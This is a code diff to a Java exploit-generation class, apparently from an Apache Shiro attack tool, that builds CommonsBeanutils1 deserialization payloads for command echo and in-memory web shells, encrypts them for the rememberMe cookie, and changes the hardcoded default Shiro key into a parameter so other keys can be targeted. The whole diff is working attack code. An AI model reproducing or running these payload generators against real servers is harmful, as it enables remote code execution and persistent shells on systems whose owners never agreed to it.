@@ -54,7 +54,7 @@ public class CommonsBeanutils1 {
         return barr.toByteArray();
     }
 
-    public static String genEchoPayload(String echoPayload) throws Exception {
+    public static String genEchoPayload(String echoPayload, String key) throws Exception {
         ClassPool pool = ClassPool.getDefault();
         CtClass ctClass;
         CtClass superClass;
@@ -75,7 +75,7 @@ public class CommonsBeanutils1 {
             // 生成反序列化payload
             byte[] payload = new CommonsBeanutils1().getPayload(ctClass.toBytecode());
             String data = Base64.getEncoder().encodeToString(payload);
-            String result = Tools.CBC_Encrypt("kPH+bIxk5D2deZiIxcaaaA==", data);
+            String result = Tools.CBC_Encrypt(key, data);
 //            System.out.println(result);
             return result;
         } else if (echoPayload.equals("SpringEcho")){
@@ -93,7 +93,7 @@ public class CommonsBeanutils1 {
             // 生成反序列化payload
             byte[] payload = new CommonsBeanutils1().getPayload(ctClass.toBytecode());
             String data = Base64.getEncoder().encodeToString(payload);
-            String result = Tools.CBC_Encrypt("kPH+bIxk5D2deZiIxcaaaA==", data);
+            String result = Tools.CBC_Encrypt(key, data);
             return result;
         } else if (echoPayload.equals("AllEcho")) {
             // 获取回显类型
@@ -110,14 +110,14 @@ public class CommonsBeanutils1 {
             // 生成反序列化payload
             byte[] payload = new CommonsBeanutils1().getPayload(ctClass.toBytecode());
             String data = Base64.getEncoder().encodeToString(payload);
-            String result = Tools.CBC_Encrypt("kPH+bIxk5D2deZiIxcaaaA==", data);
+            String result = Tools.CBC_Encrypt(key, data);
             return result;
         }
 
         return null;
     }
 
-    public static String genMemPayload() throws Exception {
+    public static String genMemPayload(String key) throws Exception {
         ClassPool pool = ClassPool.getDefault();
         CtClass ctClass;
         CtClass superClass;
@@ -136,7 +136,7 @@ public class CommonsBeanutils1 {
         // 生成反序列化payload
         byte[] payload = new CommonsBeanutils1().getPayload(ctClass.toBytecode());
         String data = Base64.getEncoder().encodeToString(payload);
-        String result = Tools.CBC_Encrypt("kPH+bIxk5D2deZiIxcaaaA==", data);
+        String result = Tools.CBC_Encrypt(key, data);
         return result;
     }
 
